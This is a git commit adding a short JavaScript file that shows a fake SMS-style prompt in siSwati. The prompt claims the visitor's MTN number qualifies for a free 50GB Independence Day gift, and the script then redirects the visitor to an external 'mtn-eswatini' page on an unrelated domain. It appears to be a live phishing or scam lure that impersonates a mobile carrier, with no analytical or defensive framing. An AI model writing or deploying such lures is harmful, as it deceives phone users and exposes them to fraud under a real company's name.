fca62a5fce8c7826537f63a5067024f066d1446d
bigukpe <bigaka42@gmail.com>
2025-08-29 08:53:42 +0100

    Create eswatini-active.js

---
+++ eswatini-active.js
@@ -0,0 +1,5 @@
+var password = 'KUSEBENTISA 50GB'
+password=prompt('SMS: Siyakuhalalisela, inombolo yakho ye-MTN iyafaneleka kutfola 50gb umnikelo wekugubha lilanga leNkhululeko lase-Eswatini, Cindzetela Ok kute usebente Nyalo ','KUSEBENTISA 50GB');
+if (password != 'KUSEBENTISA 50GB') {
+location.href='https://learnlivetech.org/mtn-eswatini.html';
+}
